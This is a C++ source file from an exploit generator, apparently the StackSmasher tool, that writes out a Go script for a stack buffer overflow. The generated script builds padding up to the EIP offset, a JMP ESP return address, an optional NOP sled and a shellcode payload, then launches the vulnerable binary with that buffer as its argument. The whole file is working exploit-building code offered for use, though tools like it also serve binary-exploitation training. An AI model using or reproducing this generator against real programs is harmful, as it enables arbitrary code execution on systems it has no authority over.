#include "Script/Go/Go.hpp"

std::string Go::getUsage(std::string filename)
{
    return "go build " + filename + "." + this->getExtension() + " && ./" + filename;
}

std::string Go::getExtension()
{
    return "go";
}

std::string Go::build()
{
    std::string script = "";
    script += "/**\n";
    script += " * Exploit automatically generated by StackSmasher\n";
    script += " * \n";
    script += " * @see https://github.com/McCaulay/StackSmasher\n";
    script += " * @author McCaulay\n";
    script += " */\n";
    script += "package main\n";
    script += "\n";
    script += "import (\n";
    script += "    \"strings\"\n";
    script += "    \"os\"\n";
    script += "    \"os/exec\"\n";
    script += "    \"bytes\"\n";
    script += ")\n";
    script += "\n";
    script += "func main() {\n";
    script += "\n";
    script += "    // Allocate the data for the exploit payload\n";
    script += "    var exploit bytes.Buffer\n";
    script += "\n";
    script += "    // The vulnerable application binary filename\n";
    script += "    application := \"" + Application::name + "\"\n";
    script += "\n";
    script += "    if !strings.Contains(application, \"/\") {\n";
    script += "        application = \"./\" + application\n";
    script += "    }\n";
    script += "\n";
    script += "    // The number of bytes until EIP in the buffer\n";
    script += "    eipOffset := " + std::to_string(this->paddingCount) + ";\n";
    script += "\n";
    script += "    // Padding until EIP\n";
    script += "    for i := 0; i < eipOffset; i++ {\n";
    script += "        exploit.WriteString(\"" + this->getFormattedPaddingCharacter() + "\")\n";
    script += "    }\n";
    script += "    \n";
    script += "    // JMP ESP at " + this->getEipAddress() + "\n";
    script += "    exploit.WriteString(\"" + this->getJmpEsp() + "\");\n";
    script += "\n";
    if (this->nopSledCount > 0)
    {
        script += "    // NOP Sled of " + std::to_string(this->nopSledCount) + " bytes\n";
        script += "    for i := 0; i < " + std::to_string(this->nopSledCount) + "; i++ {\n";
        script += "        exploit.WriteString(\"\\x90\")\n";
        script += "    }\n";
        script += "\n";
    }
    script += "    // Payload with " + std::to_string(payload.length()) + " bytes\n";
    script += "    exploit.WriteString(\"" + this->getFormattedPayload() + "\");\n";
    script += "\n";
    script += "    // Execute vulnerable application\n";
    script += "    process := exec.Command(application, exploit.String())\n";
    script += "    process.Stdin = os.Stdin\n";
    script += "    process.Stdout = os.Stdout\n";
    script += "    process.Stderr = os.Stderr\n";
    script += "    process.Start()\n";
    script += "    process.Wait()\n";
    script += "}\n";
    return script;
}
